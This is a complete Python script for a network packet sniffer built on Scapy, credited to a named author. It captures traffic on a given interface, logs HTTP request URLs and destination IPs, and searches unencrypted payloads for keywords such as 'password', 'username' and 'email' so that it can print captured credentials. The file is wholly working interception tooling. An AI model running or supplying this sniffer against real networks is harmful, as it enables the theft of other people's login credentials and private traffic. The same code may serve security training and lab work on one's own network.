#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from argparse import ArgumentParser
from colorama import Fore
import sys

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write("Please update and make sure you use the command python3 packet_sniffer.py -i <interface>\n\n")
    sys.exit(0)


def ascii_console_art():
    print("""
  _____            _        _          _  ___  ___
(_____ \          | |      | |        (_)/ __)/ __)
 _____) )___  ____| |  _    \ \  ____  _| |__| |__
|  ____/ _  |/ ___) | / )    \ \|  _ \| |  __)  __)
| |   ( ( | ( (___| |< ( _____) ) | | | | |  | |
|_|    \_||_|\____)_| \_|______/|_| |_|_|_|  |_|
""")
    print('Network packet sniffer, developed and coded by Saher Muhamed - version 1.0.1')
    print('============================================================================')


def args():
    parser = ArgumentParser()
    parser.add_argument('-i', '--interface', dest='iface', help='specify you card interface, run (ifconfig)')
    options = parser.parse_args()
    if not options.iface:
        parser.error("[-] Please specify a valid interface card, or type it correctly, ex: --interface wlan0")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)  # store=False that tells scapy do not store flowing packets in memory so
    # that it doesn't cause too much pressure on our machine


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # check if a packet contains any layers (http)
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(Fore.RESET + "[+] HTTP Request ==> " + str(url) + " is at " + str(packet[scapy.IP].dst))  # print
        # possible urls and it's ip addresses

        if packet.haslayer(scapy.Raw):  # check if a packet contains any layers (raw)
            load = str(packet[scapy.Raw].load)
            keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password', 'passwd']
            for keyword in keywords:
                if keyword in load:
                    print(Fore.YELLOW + "\n[+] Possible credentials ==> " + load + "\n")
                    break


ascii_console_art()
sniff(interface=args().iface)
